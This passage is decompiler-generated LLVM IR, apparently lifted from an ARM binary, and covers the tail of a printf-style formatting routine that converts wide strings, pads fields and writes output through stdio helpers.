  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_23b98, %bb160 ]
  %v0_23bd0 = phi i32 [ 1, %bb161 ], [ %v3_23b98, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_23ba8 = and i32 %v0_23ba8, 16
  %v2_23ba8 = icmp eq i32 %v1_23ba8, 0
  %v2_23bb4 = sub i32 %v2_23b48, %v0_23bec
  store i32 %v2_23bb4, i32* @r5, align 4
  br i1 %v2_23ba8, label %bb169, label %dec_label_pc_23bbc

dec_label_pc_23bbc:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_23bbc
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_23bbc, %bb163
  br i1 %v7_23bc8, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_23bd0, %v2_23bb4
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_23bd4, label %dec_label_pc_23bdc, label %bb169

dec_label_pc_23bdc:                               ; preds = %bb167
  %v1_23bdc = inttoptr i32 %v0_23bec to i8*
  %v2_23bdc = load i8, i8* %v1_23bdc, align 1
  %v7_23be0 = icmp eq i8 %v2_23bdc, 48
  br i1 %v7_23be0, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_23bdc
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_23bdc
  %v2_23be8 = add i32 %v2_23bb4, 1
  store i32 %v2_23be8, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_23c2c = phi i32 [ %v0_23bd0, %bb167 ], [ %v0_23bd0, %bb162 ], [ 1, %bb168 ], [ %v2_23be8, %.thread24 ], [ %v0_23bd0, %bb166 ]
  %v1_23bec = inttoptr i32 %v0_23bec to i8*
  %v2_23bec = load i8, i8* %v1_23bec, align 1
  %v7_23bf0 = icmp eq i8 %v2_23bec, 48
  br i1 %v7_23bf0, label %dec_label_pc_23bf8, label %dec_label_pc_23c28

dec_label_pc_23bf8:                               ; preds = %bb169
  %v0_23bfc = load i32, i32* @r6, align 4
  %v7_23c00 = icmp slt i32 %v0_23bfc, 6
  br i1 %v7_23c00, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_23bf8
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_23bf8, %bb170
  br i1 %v7_23b18, label %.thread27, label %dec_label_pc_23c1c

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37564), i32* @r4, align 4
  br label %dec_label_pc_23c34

dec_label_pc_23c1c:                               ; preds = %bb171
  %v2_23c1c = icmp eq i32 %v5_23c2c, 0
  br i1 %v2_23c1c, label %bb172, label %dec_label_pc_23c28

bb172:                                            ; preds = %dec_label_pc_23c1c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_23c34

dec_label_pc_23c28:                               ; preds = %dec_label_pc_23c1c, %bb169
  %v2_23c28 = sub i32 %v5_23c2c, %v2_23bb4
  %tmp211 = icmp ugt i32 %v5_23c2c, %v2_23bb4
  br i1 %tmp211, label %.thread85, label %dec_label_pc_23c34

.thread85:                                        ; preds = %dec_label_pc_23c28
  store i32 %v2_23c28, i32* @r8, align 4
  br label %dec_label_pc_23e48thread-pre-split

dec_label_pc_23c34:                               ; preds = %dec_label_pc_23c28, %.thread27, %bb172
  %v1_23e4c.pre205 = phi i32 [ %v2_23bb4, %dec_label_pc_23c28 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_23e48thread-pre-split

dec_label_pc_23c3c:                               ; preds = %dec_label_pc_23aa0
  br i1 %tmp208, label %dec_label_pc_23c7c, label %dec_label_pc_23c44

dec_label_pc_23c44:                               ; preds = %dec_label_pc_23c3c
  %v3_23c54 = load i32, i32* %stack_var_-72, align 4
  %v0_23c58 = load i32, i32* @fp, align 4
  store i32 %v0_23c58, i32* %r0.global-to-local, align 4
  %v1_23c5c = inttoptr i32 %v3_23c54 to i32*
  %v2_23c5c = load i32, i32* %v1_23c5c, align 4
  store i32 %v2_23c5c, i32* %r2.global-to-local, align 4
  %v3_23c5c = add i32 %v3_23c54, 4
  %v4_23c5c = inttoptr i32 %v3_23c5c to i32*
  %v5_23c5c = load i32, i32* %v4_23c5c, align 4
  %v8_23c60 = call i32 @_fpmaxtostr(i32 %v0_23c58, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -127084) to i64) to double), i32 %v2_23c5c, i32 %v5_23c5c, i32 %v2_23df8, i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -127084))
  store i32 %v8_23c60, i32* %r0.global-to-local, align 4
  %v1_23c64 = icmp slt i32 %v8_23c60, 0
  br i1 %v1_23c64, label %dec_label_pc_23fa0, label %dec_label_pc_23c6c

dec_label_pc_23c6c:                               ; preds = %dec_label_pc_23c44
  %v2_23c70 = add i32 %v8_23c60, %v1_23e78
  store i32 %v2_23c70, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_23f8c

dec_label_pc_23c7c:                               ; preds = %dec_label_pc_23c3c
  br i1 %v3_23c80, label %dec_label_pc_23d04, label %dec_label_pc_23c84

dec_label_pc_23c84:                               ; preds = %dec_label_pc_23c7c
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_23c8c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_23c8c, i32* %r0.global-to-local, align 4
  br i1 %v7_23c7c, label %dec_label_pc_23c94, label %dec_label_pc_23ccc

dec_label_pc_23c94:                               ; preds = %dec_label_pc_23c84
  %v1_23c94 = inttoptr i32 %v3_23c8c to i32*
  %v2_23c94 = load i32, i32* %v1_23c94, align 4
  %v9_23c98 = icmp eq i32 %v2_23c94, 0
  store i32 %v2_23c94, i32* %stack_var_-44, align 4
  br i1 %v9_23c98, label %dec_label_pc_23d44, label %dec_label_pc_23ca4

dec_label_pc_23ca4:                               ; preds = %dec_label_pc_23c94
  %v3_23ca4 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_23ca8, i32* @r0, align 4
  %v4_23cac = ashr i32 %v3_23ca4, 31
  %v5_23cac = or i32 %v4_23cac, %v3_23ca4
  store i32 %v5_23cac, i32* %r2.global-to-local, align 4
  store i32 %v2_23ca8, i32* @r1, align 4
  %v6_23cb8 = call i32 @__GI_wcsrtombs(i32 %v2_23ca8, i32 %v2_23ca8, i32 %v5_23cac, i32 %v2_23cb4, i32 0, i32 %v2_23c94)
  store i32 %v6_23cb8, i32* %r0.global-to-local, align 4
  %v3_23cbc = icmp eq i32 %v6_23cb8, -1
  store i32 %v6_23cb8, i32* @r5, align 4
  br i1 %v3_23cbc, label %dec_label_pc_23fa0, label %dec_label_pc_23e38

dec_label_pc_23ccc:                               ; preds = %dec_label_pc_23c84
  store i32 %v2_23db8, i32* %r7.global-to-local, align 4
  %v1_23cd0 = inttoptr i32 %v3_23c8c to i32*
  %v2_23cd0 = load i32, i32* %v1_23cd0, align 4
  store i32 %v2_23cb4, i32* %r2.global-to-local, align 4
  store i32 %v2_23db8, i32* %r0.global-to-local, align 4
  %v5_23cdc = call i32 @__GI_wcrtomb(i32 %v2_23db8, i32 %v2_23cd0, i32 %v2_23cb4, i32 %tmp105, i32 0)
  store i32 %v5_23cdc, i32* %r0.global-to-local, align 4
  %v7_23ce0 = icmp eq i32 %v5_23cdc, -1
  store i32 %v5_23cdc, i32* @r5, align 4
  br i1 %v7_23ce0, label %dec_label_pc_23fa0, label %dec_label_pc_23cec

dec_label_pc_23cec:                               ; preds = %dec_label_pc_23ccc
  %v0_23cec = load i32, i32* @sl, align 4
  store i32 %v0_23cec, i32* @r8, align 4
  store i32 %v2_23db8, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_23cfc = trunc i32 %v0_23cec to i8
  %v2_23cfc = load i32, i32* %r7.global-to-local, align 4
  %v4_23cfc = add i32 %v2_23cfc, %v5_23cdc
  %v5_23cfc = inttoptr i32 %v4_23cfc to i8*
  store i8 %v1_23cfc, i8* %v5_23cfc, align 1
  %v0_23e4c.pre.pre = load i32, i32* @r8, align 4
  %v1_23e4c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_23e48thread-pre-split

dec_label_pc_23d04:                               ; preds = %dec_label_pc_23c7c
  br i1 %v3_23d08, label %dec_label_pc_23da0, label %dec_label_pc_23d0c

dec_label_pc_23d0c:                               ; preds = %dec_label_pc_23d04
  %v3_23d0c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_23d0c, i32* %r0.global-to-local, align 4
  %v1_23d14 = inttoptr i32 %v3_23d0c to i32*
  %v2_23d14 = load i32, i32* %v1_23d14, align 4
  br i1 %v7_23d04, label %dec_label_pc_23d14, label %dec_label_pc_23d78

dec_label_pc_23d14:                               ; preds = %dec_label_pc_23d0c
  store i32 %v2_23d14, i32* @r4, align 4
  %v2_23d18 = icmp eq i32 %v2_23d14, 0
  br i1 %v2_23d18, label %dec_label_pc_23d44, label %dec_label_pc_23d20

dec_label_pc_23d20:                               ; preds = %dec_label_pc_23d14, %dec_label_pc_23da8
  %v0_23d24 = phi i32 [ %v2_23d14, %dec_label_pc_23d14 ], [ %v4_23dc0, %dec_label_pc_23da8 ]
  %v3_23d20 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_23d24, i32* %r0.global-to-local, align 4
  %v4_23d28 = ashr i32 %v3_23d20, 31
  %v5_23d28 = or i32 %v4_23d28, %v3_23d20
  %v2_23d2c = inttoptr i32 %v0_23d24 to i8*
  %v3_23d2c = call i32 @strnlen(i8* %v2_23d2c, i32 %v5_23d28)
  store i32 %v3_23d2c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_23d2c, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_23e48

dec_label_pc_23d44:                               ; preds = %dec_label_pc_23d14, %dec_label_pc_23c94
  %v3_23d44 = load i32, i32* %stack_var_-348, align 4
  %v1_23d48 = icmp slt i32 %v3_23d44, 0
  br i1 %v1_23d48, label %dec_label_pc_23d60, label %dec_label_pc_23d50

dec_label_pc_23d50:                               ; preds = %dec_label_pc_23d44
  %tmp212 = icmp ult i32 %v3_23d44, 6
  br i1 %tmp212, label %dec_label_pc_23d68, label %dec_label_pc_23d60

dec_label_pc_23d60:                               ; preds = %dec_label_pc_23d50, %dec_label_pc_23d44
  br label %dec_label_pc_23d68

dec_label_pc_23d68:                               ; preds = %dec_label_pc_23d50, %dec_label_pc_23d60
  %storemerge97 = phi i32 [ 6, %dec_label_pc_23d60 ], [ 0, %dec_label_pc_23d50 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37556), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_23e48

dec_label_pc_23d78:                               ; preds = %dec_label_pc_23d0c
  store i32 %v2_23d14, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_23db8, i32* @r4, align 4
  store i32 %v2_23d14, i32* %stack_var_-200, align 4
  br label %dec_label_pc_23e48thread-pre-split

dec_label_pc_23da0:                               ; preds = %dec_label_pc_23d04
  br i1 %v7_23da0, label %dec_label_pc_23da8, label %dec_label_pc_23dcc

dec_label_pc_23da8:                               ; preds = %dec_label_pc_23da0
  %v0_23dac = call i32 @__aeabi_read_tp()
  store i32 %v0_23dac, i32* %r0.global-to-local, align 4
  %v3_23db0 = load i16, i16* @global_var_42934.3040, align 2
  %v4_23db0 = sext i16 %v3_23db0 to i32
  %v2_23db4 = add i32 %v4_23db0, %v0_23dac
  %v3_23db4 = inttoptr i32 %v2_23db4 to i32*
  %v4_23db4 = load i32, i32* %v3_23db4, align 4
  store i32 %v4_23db4, i32* @r0, align 4
  %v0_23dbc = load i32, i32* %r2.global-to-local, align 4
  %v1_23dbc = add i32 %v0_23dbc, 108
  store i32 %v1_23dbc, i32* @r2, align 4
  %v4_23dc0 = call i32 @__GI___glibc_strerror_r(i32 %v4_23db4, i32 %v2_23db8, i32 %v1_23dbc, i32 %v4_23db0)
  store i32 %v4_23dc0, i32* %r0.global-to-local, align 4
  store i32 %v4_23dc0, i32* @r4, align 4
  br label %dec_label_pc_23d20

dec_label_pc_23dcc:                               ; preds = %dec_label_pc_23da0
  %v4_23dd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 604) to i32*), align 4
  %v1_23ddc = add i32 %v4_23dd4, 10
  store i32 %v1_23ddc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_23de0

dec_label_pc_23de0:                               ; preds = %dec_label_pc_23e28, %dec_label_pc_23dcc
  %v1_23df0 = phi i32 [ %v1_23e28, %dec_label_pc_23e28 ], [ %v4_23dd4, %dec_label_pc_23dcc ]
  %v1_23de0 = inttoptr i32 %v1_23df0 to i8*
  %v2_23de0 = load i8, i8* %v1_23de0, align 1
  %v3_23de0 = zext i8 %v2_23de0 to i32
  store i32 %v3_23de0, i32* %r2.global-to-local, align 4
  %v9_23de8 = icmp eq i32 %v3_23de0, %tmp99
  br i1 %v9_23de8, label %dec_label_pc_23df0, label %dec_label_pc_23e28

dec_label_pc_23df0:                               ; preds = %dec_label_pc_23de0
  %v2_23df0 = sub i32 %v1_23df0, %v4_23dd4
  %v0_23df4 = load i32, i32* @fp, align 4
  store i32 %v0_23df4, i32* %r0.global-to-local, align 4
  store i32 %v2_23dfc, i32* %r2.global-to-local, align 4
  %v4_23e04 = mul i32 %v2_23df0, 4
  %v5_23e04 = add i32 %v4_23e04, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 28908)
  %v6_23e04 = inttoptr i32 %v5_23e04 to i32*
  %v7_23e04 = load i32, i32* %v6_23e04, align 4
  store i32 146960, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_23e04)
  %v0_23e10 = load i32, i32* %r0.global-to-local, align 4
  %v1_23e10 = icmp slt i32 %v0_23e10, 0
  br i1 %v1_23e10, label %dec_label_pc_23fa0, label %dec_label_pc_23e18

dec_label_pc_23e18:                               ; preds = %dec_label_pc_23df0
  %v2_23e1c = add i32 %v0_23e10, %v1_23e78
  br label %dec_label_pc_23f8c

dec_label_pc_23e28:                               ; preds = %dec_label_pc_23de0
  %v1_23e28 = add i32 %v1_23df0, 1
  %v3_23e2c = icmp ult i32 %v1_23e28, %v1_23ddc
  br i1 %v3_23e2c, label %dec_label_pc_23de0, label %dec_label_pc_23fa0

dec_label_pc_23e38:                               ; preds = %dec_label_pc_23ca4
  %v0_23e38 = load i32, i32* @sl, align 4
  store i32 %v0_23e38, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_23e38, i32* @r4, align 4
  br label %dec_label_pc_23e48

dec_label_pc_23e48thread-pre-split:               ; preds = %.thread85, %dec_label_pc_23c34, %dec_label_pc_23cec, %dec_label_pc_23d78
  %v1_23e4c.pre = phi i32 [ %v1_23e4c.pre205, %dec_label_pc_23c34 ], [ %v1_23e4c.pre.pre, %dec_label_pc_23cec ], [ 1, %dec_label_pc_23d78 ], [ %v2_23bb4, %.thread85 ]
  %v0_23e4c.pre = phi i32 [ 0, %dec_label_pc_23c34 ], [ %v0_23e4c.pre.pre, %dec_label_pc_23cec ], [ 0, %dec_label_pc_23d78 ], [ %v2_23c28, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_23ba8, %dec_label_pc_23c34 ], [ %v0_23ad8, %dec_label_pc_23cec ], [ %v0_23ad8, %dec_label_pc_23d78 ], [ %v0_23ba8, %.thread85 ]
  %v0_23e48.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_23e48

dec_label_pc_23e48:                               ; preds = %dec_label_pc_23e48thread-pre-split, %dec_label_pc_23d68, %dec_label_pc_23d20, %dec_label_pc_23e38
  %v1_23e4c = phi i32 [ %v1_23e4c.pre, %dec_label_pc_23e48thread-pre-split ], [ %storemerge97, %dec_label_pc_23d68 ], [ %v3_23d2c, %dec_label_pc_23d20 ], [ %v6_23cb8, %dec_label_pc_23e38 ]
  %v0_23e4c = phi i32 [ %v0_23e4c.pre, %dec_label_pc_23e48thread-pre-split ], [ 0, %dec_label_pc_23d68 ], [ 0, %dec_label_pc_23d20 ], [ %v0_23e38, %dec_label_pc_23e38 ]
  %v0_23e54 = phi i32 [ %v0_23e48.pr, %dec_label_pc_23e48thread-pre-split ], [ 11, %dec_label_pc_23d68 ], [ 11, %dec_label_pc_23d20 ], [ 11, %dec_label_pc_23e38 ]
  %v0_23e94 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_23e48thread-pre-split ], [ %v0_23ad8, %dec_label_pc_23d68 ], [ %v0_23ad8, %dec_label_pc_23d20 ], [ %v0_23ad8, %dec_label_pc_23e38 ]
  %v7_23e48 = icmp eq i32 %v0_23e54, 11
  %v2_23e4c = add i32 %v1_23e4c, %v0_23e4c
  br i1 %v7_23e48, label %dec_label_pc_23e64, label %bb173

bb173:                                            ; preds = %dec_label_pc_23e48
  %v7_23e5c = icmp sgt i32 %v0_23e54, 5
  %. = select i1 %v7_23e5c, i32 2, i32 1
  %v2_23e60 = add i32 %v2_23e4c, %.
  br label %dec_label_pc_23e64

dec_label_pc_23e64:                               ; preds = %dec_label_pc_23e48, %bb173
  %v0_23e78 = phi i32 [ %v2_23e4c, %dec_label_pc_23e48 ], [ %v2_23e60, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_23e68 = icmp uge i32 %tmp98, %v0_23e78
  %v9_23e68 = icmp eq i32 %tmp98, %v0_23e78
  %v2_23e6c = xor i1 %v9_23e68, true
  %v3_23e6c = and i1 %v3_23e68, %v2_23e6c
  br i1 %v3_23e6c, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_23e64
  %v2_23e68 = sub i32 %tmp98, %v0_23e78
  store i32 %v2_23e68, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_23e64, %bb174
  store i32 %v1_23e78, i32* %r2.global-to-local, align 4
  %v2_23e74 = xor i1 %v3_23e68, true
  %v3_23e74 = or i1 %v9_23e68, %v2_23e74
  br i1 %v3_23e74, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_23e7c.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_23e8c = phi i32 [ %v1_23e7c.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_23e78 = add i32 %v0_23e78, %v1_23e78
  %v2_23e7c = add i32 %v2_23e78, %v2_23e8c
  %v0_23e88 = load i32, i32* @sb, align 4
  %v7_23e88 = icmp eq i32 %v0_23e88, 48
  br i1 %v7_23e88, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_23e8c = add i32 %v2_23e8c, %v0_23e4c
  store i32 %v3_23e8c, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_23ea4 = phi i32 [ %v2_23e8c, %bb177 ], [ 0, %bb178 ]
  %v1_23e94 = and i32 %v0_23e94, 8
  store i32 %v1_23e94, i32* @r7, align 4
  %v2_23e94 = icmp eq i32 %v1_23e94, 0
  br i1 %v2_23e94, label %dec_label_pc_23e9c, label %dec_label_pc_23eb8

dec_label_pc_23e9c:                               ; preds = %.thread30
  %v0_23e9c = load i32, i32* @fp, align 4
  store i32 %v0_23e9c, i32* %r0.global-to-local, align 4
  store i32 %v0_23ea4, i32* %r2.global-to-local, align 4
  %v4_23ea8 = call i32 @_charpad(i32 %v0_23e9c, i8 32, i32 %v0_23ea4)
  store i32 %v4_23ea8, i32* %r0.global-to-local, align 4
  %v1_23eac = load i32, i32* @sl, align 4
  %v9_23eac = icmp eq i32 %v4_23ea8, %v1_23eac
  br i1 %v9_23eac, label %dec_label_pc_23eb4, label %dec_label_pc_23fa0

dec_label_pc_23eb4:                               ; preds = %dec_label_pc_23e9c
  %v0_23eb4 = load i32, i32* @r7, align 4
  store i32 %v0_23eb4, i32* @sl, align 4
  %v0_23ec0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_23eb8

dec_label_pc_23eb8:                               ; preds = %.thread30, %dec_label_pc_23eb4
  %v0_23ec0 = phi i32 [ %v0_23e54, %.thread30 ], [ %v0_23ec0.pre, %dec_label_pc_23eb4 ]
  %v0_23ebc = load i32, i32* @fp, align 4
  %v2_23ec0 = add i32 %v0_23ec0, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37548)
  store i32 %v2_23ec0, i32* %r0.global-to-local, align 4
  %v2_23ec4 = inttoptr i32 %v2_23ec0 to i8*
  %v3_23ec4 = call i32 @__GI_fputs_unlocked(i8* %v2_23ec4, i32 %v0_23ebc)
  %v0_23ec8 = load i32, i32* @fp, align 4
  store i32 %v0_23ec8, i32* %r0.global-to-local, align 4
  %v0_23ed0 = load i32, i32* @r8, align 4
  store i32 %v0_23ed0, i32* %r2.global-to-local, align 4
  %v4_23ed4 = call i32 @_charpad(i32 %v0_23ec8, i8 48, i32 %v0_23ed0)
  store i32 %v4_23ed4, i32* %r0.global-to-local, align 4
  %v1_23ed8 = load i32, i32* @r8, align 4
  %v9_23ed8 = icmp eq i32 %v4_23ed4, %v1_23ed8
  br i1 %v9_23ed8, label %dec_label_pc_23ee0, label %dec_label_pc_23fa0

dec_label_pc_23ee0:                               ; preds = %dec_label_pc_23eb8
  %v3_23ee0 = load i32, i32* %stack_var_-44, align 4
  %v2_23ee4 = icmp eq i32 %v3_23ee0, 0
  br i1 %v2_23ee4, label %dec_label_pc_23eec, label %dec_label_pc_23f10

dec_label_pc_23eec:                               ; preds = %dec_label_pc_23ee0
  %v0_23eec = load i32, i32* @r5, align 4
  %v2_23eec = icmp eq i32 %v0_23eec, 0
  br i1 %v2_23eec, label %dec_label_pc_23f74, label %dec_label_pc_23ef4

dec_label_pc_23ef4:                               ; preds = %dec_label_pc_23eec
  %v0_23ef4 = load i32, i32* @r4, align 4
  store i32 %v0_23ef4, i32* %r0.global-to-local, align 4
  %v0_23efc = load i32, i32* @fp, align 4
  store i32 %v0_23efc, i32* %r2.global-to-local, align 4
  %v3_23f00 = inttoptr i32 %v0_23efc to i16*
  %v4_23f00 = call i32 @__stdio_fwrite(i32 %v0_23ef4, i32 %v0_23eec, i16* %v3_23f00)
  store i32 %v4_23f00, i32* %r0.global-to-local, align 4
  %v1_23f04 = load i32, i32* @r5, align 4
  %v9_23f04 = icmp eq i32 %v4_23f00, %v1_23f04
  br i1 %v9_23f04, label %dec_label_pc_23f74, label %dec_label_pc_23fa0

dec_label_pc_23f10:                               ; preds = %dec_label_pc_23ee0
  store i32 %v2_23db8, i32* @r6, align 4
  store i32 %v2_23ca8, i32* @r8, align 4
  store i32 %v2_23cb4, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_23f60.pr = load i32, i32* @r5, align 4
  %v2_23f6041 = icmp eq i32 %v0_23f60.pr, 0
  store i32 %v2_23ca8, i32* @r1, align 4
  store i32 %v2_23db8, i32* @r0, align 4
  br i1 %v2_23f6041, label %dec_label_pc_23f74, label %dec_label_pc_23f28

dec_label_pc_23f28:                               ; preds = %dec_label_pc_23f10, %dec_label_pc_23f5c
  %v1_23f2c = phi i32 [ %v2_23f5c, %dec_label_pc_23f5c ], [ %v0_23f60.pr, %dec_label_pc_23f10 ]
  %v2_23f28 = icmp ult i32 %v1_23f2c, 128
  %.v1_23f2c = select i1 %v2_23f28, i32 %v1_23f2c, i32 128
  store i32 %.v1_23f2c, i32* %r2.global-to-local, align 4
  %v6_23f34 = call i32 @__GI_wcsrtombs(i32 %v2_23db8, i32 %v2_23ca8, i32 %.v1_23f2c, i32 %v2_23cb4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_23f34, i32* @r4, align 4
  %v2_23f38 = icmp eq i32 %v6_23f34, 0
  store i32 %v6_23f34, i32* %r0.global-to-local, align 4
  br i1 %v2_23f38, label %dec_label_pc_23f5c, label %dec_label_pc_23f44

dec_label_pc_23f44:                               ; preds = %dec_label_pc_23f28
  store i32 %v2_23db8, i32* %r0.global-to-local, align 4
  %v0_23f4c = load i32, i32* @fp, align 4
  store i32 %v0_23f4c, i32* %r2.global-to-local, align 4
  %v3_23f50 = inttoptr i32 %v0_23f4c to i16*
  %v4_23f50 = call i32 @__stdio_fwrite(i32 %v2_23db8, i32 %v6_23f34, i16* %v3_23f50)
  store i32 %v4_23f50, i32* %r0.global-to-local, align 4
  %v1_23f54 = load i32, i32* @r4, align 4
  %v9_23f54 = icmp eq i32 %v4_23f50, %v1_23f54
  br i1 %v9_23f54, label %dec_label_pc_23f5c, label %dec_label_pc_23fa0

dec_label_pc_23f5c:                               ; preds = %dec_label_pc_23f44, %dec_label_pc_23f28
  %v0_23f5c = phi i32 [ %v4_23f50, %dec_label_pc_23f44 ], [ 0, %dec_label_pc_23f28 ]
  %v1_23f5c = load i32, i32* @r5, align 4
  %v2_23f5c = sub i32 %v1_23f5c, %v0_23f5c
  store i32 %v2_23f5c, i32* @r5, align 4
  %v2_23f60 = icmp eq i32 %v2_23f5c, 0
  store i32 %v2_23ca8, i32* @r1, align 4
  store i32 %v2_23db8, i32* @r0, align 4
  br i1 %v2_23f60, label %dec_label_pc_23f74, label %dec_label_pc_23f28

dec_label_pc_23f74:                               ; preds = %dec_label_pc_23f5c, %dec_label_pc_23f10, %dec_label_pc_23ef4, %dec_label_pc_23eec
  %v0_23f74 = load i32, i32* @fp, align 4
  store i32 %v0_23f74, i32* %r0.global-to-local, align 4
  %v0_23f7c = load i32, i32* @sl, align 4
  store i32 %v0_23f7c, i32* %r2.global-to-local, align 4
  %v4_23f80 = call i32 @_charpad(i32 %v0_23f74, i8 32, i32 %v0_23f7c)
  store i32 %v4_23f80, i32* %r0.global-to-local, align 4
  %v1_23f84 = load i32, i32* @sl, align 4
  %v9_23f84 = icmp eq i32 %v4_23f80, %v1_23f84
  br i1 %v9_23f84, label %dec_label_pc_23f8c, label %dec_label_pc_23fa0

dec_label_pc_23f8c:                               ; preds = %dec_label_pc_23f74, %dec_label_pc_23e18, %dec_label_pc_23c6c, %dec_label_pc_23a7c
  %stack_var_-336.4 = phi i32 [ %v0_23ad8, %dec_label_pc_23a7c ], [ %v0_23e94, %dec_label_pc_23f74 ], [ %v0_23ad8, %dec_label_pc_23e18 ], [ %v0_23ad8, %dec_label_pc_23c6c ]
  %stack_var_-356.3 = phi i32 [ %v1_23e78, %dec_label_pc_23a7c ], [ %v2_23e7c, %dec_label_pc_23f74 ], [ %v2_23e1c, %dec_label_pc_23e18 ], [ %v2_23c70, %dec_label_pc_23c6c ]
  %v3_23f8c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_23f8c, i32* @r4, align 4
  store i32 %v3_23f8c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_239a4.outer

dec_label_pc_23f98:                               ; preds = %dec_label_pc_23a00
  %v1_23f98 = add i32 %v0_23a08, 2
  store i32 %v1_23f98, i32* @r4, align 4
  br label %dec_label_pc_239a4.outer36

dec_label_pc_23fa0:                               ; preds = %dec_label_pc_23e28, %dec_label_pc_23ca4, %dec_label_pc_23f74, %dec_label_pc_23ef4, %dec_label_pc_23eb8, %dec_label_pc_23e9c, %dec_label_pc_23df0, %dec_label_pc_23ccc, %dec_label_pc_23c44, %bb142, %dec_label_pc_23f44
  br label %dec_label_pc_23fa8

dec_label_pc_23fa8:                               ; preds = %dec_label_pc_239f4, %bb, %dec_label_pc_23938, %dec_label_pc_23fa0
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_23938 ], [ -1, %dec_label_pc_23fa0 ], [ %v1_23e78, %dec_label_pc_239f4 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_238e8, i32* @r5, align 4
  store i32 %v9_238e8, i32* @r6, align 4
  store i32 %v12_238e8, i32* @r7, align 4
  store i32 %v15_238e8, i32* @r8, align 4
  store i32 %v18_238e8, i32* @sb, align 4
  store i32 %v21_238e8, i32* @sl, align 4
  store i32 %v24_238e8, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_23f98, { 1, 0 }
  uselistorder i32 %v3_23f8c, { 1, 2, 0 }
  uselistorder i32 %v2_23f5c, { 1, 2, 0 }
  uselistorder i32 %v0_23ea4, { 1, 0 }
  uselistorder i32 %v2_23e8c, { 2, 0, 1 }
  uselistorder i1 %v9_23e68, { 1, 0 }
  uselistorder i32 %v2_23e4c, { 1, 0 }
  uselistorder i32 %v0_23e94, { 1, 0 }
